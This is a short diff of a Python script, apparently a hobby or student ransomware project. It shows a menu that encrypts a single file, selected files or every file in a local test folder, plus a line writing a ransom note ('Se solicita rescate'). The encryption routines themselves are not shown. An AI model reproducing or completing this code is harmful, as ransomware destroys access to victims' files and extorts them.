@@ -72,27 +72,27 @@ def crearchivo(archivo):
         file.write("Se solicita rescate")
 
 lcvalor = 0
-while lcvalor < 4:
-    archivo = 'C:\\Users\\Brayner\\Desktop\\Nueva'
-    archivo2= ['C:\\Users\\Brayner\\Desktop\\Nueva\\ggg.txt']
-    if find(archivo+"\\"+"readme.txt"):
-        os.remove(archivo+"\\"+"readme.txt")
-    print("----Encriptacion de archivos----")
-    print("Seleccione alguna opcion:")
-    print("Encriptar Un solo archivo:1")
-    print("Encriptar archivo deseado:2")
-    print("Encriptar Todo           :3")
-    print("Salir                    :4")
-    lcvalor = int(input())
-    if lcvalor == 1:
-        PrincipalUnico(archivo,archivo2)
-        print("Encriptacion finalizado")
-    elif lcvalor == 2:
-        PrincipalDeseado(archivo)
-        print("Encriptacion finalizado")
-    elif lcvalor == 3:
-        PrincipalTodos(archivo)
-        print("Encriptacion finalizado")
-        lcvalor = 5
-    elif lcvalor == 4:
-        print("Encriptacion finalizado")
+##while lcvalor < 4:
+archivo = 'C:\\Users\\Brayner\\Desktop\\Nueva'
+archivo2= ['C:\\Users\\Brayner\\Desktop\\Nueva\\ggg.txt']
+    ##if find(archivo+"\\"+"readme.txt"):
+      ##  print("Error al intentar encriptar ya que se genero 1 vez")
+print("----Encriptacion de archivos----")
+print("Seleccione alguna opcion:")
+print("Encriptar Un solo archivo:1")
+print("Encriptar archivo deseado:2")
+print("Encriptar Todo           :3")
+print("Salir                    :4")
+lcvalor = int(input())
+if lcvalor == 1:
+    PrincipalUnico(archivo,archivo2)
+    print("Encriptacion finalizado")
+elif lcvalor == 2:
+    PrincipalDeseado(archivo)
+    print("Encriptacion finalizado")
+elif lcvalor == 3:
+    PrincipalTodos(archivo)
+    print("Encriptacion finalizado")
+    lcvalor = 5
+elif lcvalor == 4:
+    print("Encriptacion finalizado")
